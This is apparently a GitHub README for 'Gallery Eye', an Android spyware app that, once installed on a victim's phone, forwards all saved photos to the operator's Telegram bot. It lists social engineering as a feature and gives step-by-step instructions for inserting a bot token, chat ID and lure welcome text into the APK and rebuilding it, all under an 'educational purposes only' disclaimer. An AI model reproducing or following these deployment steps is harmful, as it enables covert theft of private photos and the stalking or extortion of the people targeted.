# Gallery Eye
<img src="/Preview/GalleryEyePreview.png" width="100%" />

#### This software is made for educational purposes only !
Gallery Eye is a software for spying on Android saved photos, after installing Gallery Eye on victim device, Gallery Eye will forward all victim saved photos to your telegram bot


## Features

- easy to use
- customizable
- social engineering

## Setup
#### 1 - Download Gallery Eye APK
Download Gallery Eye APK file, you can download file from this repository or download it from our [Telegram channel](https://t.me/gyroxbgmistore).
#### 2 - Downlaod Apk Editor
Download the APK Editor to customize the Gallery Eye application, you can download Apk Editor from our [Telegram channel](https://t.me/gyroxbgmistore).
#### 3 - Create Telegram bot
find Bot Father on Telegram by search on search bar or use this link : [@BotFather](https://t.me/BotFather)

start bot Father and send /newbot, choose name and username for your bot. after creating bot on bot Father you will receive your bot link and token, copy your bot token then click your bot link and start your bot.
<p float="left">
  <img src="/Preview/Frame 1.png" width="20%" />
  <img src="/Preview/Frame 2.png" width="20%" />
</p>

#### 4 - Modify Gallery Eye application
open Apk Editor and select "APK file", then head to path Then go to the path where you saved the Gallery Eye Apk file and select Gallery Eye Apk file, select full edit then Decode all files.
<p float="left">
  <img src="/Preview/Frame 3.png" width="20%" />
  <img src="/Preview/Frame 4.png" width="20%" />
  <img src="/Preview/Frame 5.png" width="20%" />
</p>

#### 5 - Enter informations
on files tab enter assets folder

<p float="left">
  <img src="/Preview/Frame 6.png" width="20%" />
</p>

you can see 5 text file, you must open theme and place your information

<p float="left">
  <img src="/Preview/Frame 7.png" width="20%" />
</p>

- open token.txt file and paste your token then click save button
- open id.txt file and paste your telegram account numric ID then click save button (you can find your numric ID by starting this bot [@userinfobot](https://t.me/userinfobot))
- opne url.txt file and enter url you want to showup on startup then click save button
- opne title.txt file and enter the title you want to showup on welcome page then click save button
- open text.txt file and enter the text you want to showup on welcome page

<p float="left">
  <img src="/Preview/Frame 9.png" width="15%" />
  <img src="/Preview/Frame 10.png" width="15%" />
  <img src="/Preview/Frame 11.png" width="15%" />
  <img src="/Preview/Frame 12.png" width="15%" />
  <img src="/Preview/Frame 13.png" width="15%" />
</p>

click save button on bottem left of screen after your information

#### 6 - build app
back to assets folder and click on Smali button on top right of screen and wait for process to finish

then click build button on top right of screen

<p float="left">
  <img src="/Preview/Frame 8.png" width="20%" />
</p>

wait for process to finish and your app is ready !

## Fallow us on social media
[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/gyroxbgmistore)
